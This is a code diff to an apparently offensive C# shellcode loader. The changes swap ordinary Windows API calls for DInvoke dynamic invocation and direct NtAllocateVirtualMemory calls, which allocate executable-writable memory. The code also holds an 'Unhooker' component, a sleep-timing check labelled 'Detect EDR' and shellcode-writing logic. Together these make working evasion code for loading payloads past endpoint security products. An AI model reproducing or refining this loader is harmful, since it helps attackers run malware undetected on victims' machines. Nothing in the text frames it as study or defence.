@@ -10,6 +10,37 @@ using DynamicInvoke = DInvoke.DynamicInvoke;
 
 namespace ShellcodeLoader
 {
+    public class Delegates
+    {
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr Sleep(uint dwMilliseconds);
+        /* // Unused
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr GetCurrentProcess();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr GetConsoleWindow();
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr ShowWindow(IntPtr hWnd, int nCmdShow);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr LoadLibrary(string name);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr MoveMemory(IntPtr dest, IntPtr src, int size);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate void Void();
+        */
+    }
     partial class Unhooker
     {
         static string[] functions =
@@ -140,7 +171,8 @@ namespace ShellcodeLoader
             IDictionary<string, IntPtr> funcAddresses = new Dictionary<string, IntPtr>();
             foreach (string function in functions)
             {
-                IntPtr funcPtr = Win32.GetProcAddress(hModule, function);
+                IntPtr funcPtr = DynamicInvoke.Generic.GetExportAddress(hModule, function);
+
                 if (funcPtr != IntPtr.Zero)
                 {
                     funcAddresses.Add(function, funcPtr);
@@ -155,43 +187,9 @@ namespace ShellcodeLoader
         }
     }
 
-    class Win32
-    {
-        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    }
     class Program
     {
-        class Delegates
-        {
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr GetCurrentProcess();
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr Sleep(uint dwMilliseconds);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr GetConsoleWindow();
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr ShowWindow(IntPtr hWnd, int nCmdShow);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr LoadLibrary(string name);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr GetProcAddress(IntPtr hModule, string procName);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate IntPtr MoveMemory(IntPtr dest, IntPtr src, int size);
-            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate void Void();
-        }
+
         public static byte[] StringToByteArray(string hex)
         {
             byte[] outr = new byte[(hex.Length / 2) + 1];
@@ -409,9 +407,8 @@ namespace ShellcodeLoader
 
             // Detect EDR
             DateTime t1 = DateTime.Now;
-            var dSleep = DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "Sleep");
             object[] parameters = { (uint)2000 };
-            DynamicInvoke.Generic.DynamicFunctionInvoke(dSleep, typeof(Delegates.Sleep), ref parameters);
+            DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "Sleep", typeof(Delegates.Sleep), ref parameters);
             double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
             if (t2 < 1.5)
             {
@@ -431,12 +428,24 @@ namespace ShellcodeLoader
             Console.WriteLine("Allocating memory, payload length: " + payloadSize);
             object[] valloc_parameters = new object[]
             {
-            IntPtr.Zero,
-            payloadSize,
-            (uint)0x3000,
-            (uint)0x40
+                IntPtr.Zero,
+                payloadSize,
+                (uint)0x3000,
+                (uint)0x40
             };
-            IntPtr addr = (IntPtr)DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "VirtualAlloc", typeof(Delegates.VirtualAlloc), ref valloc_parameters);
+           
+            IntPtr addr = IntPtr.Zero;
+            IntPtr region_size = (IntPtr)payloadSize;
+            DynamicInvoke.Native.NtAllocateVirtualMemory((IntPtr)(-1), ref addr, IntPtr.Zero, ref region_size, (uint)0x3000, (uint)0x40);
+
+            if (addr == IntPtr.Zero)
+            {
+                Console.Error.WriteLine("Allocation failed :(");
+                return 255;
+            } else
+            {
+                Console.WriteLine("Allocation successful!");
+            }
 
             // Write shellcode into memory
             if (LOLZFormat)
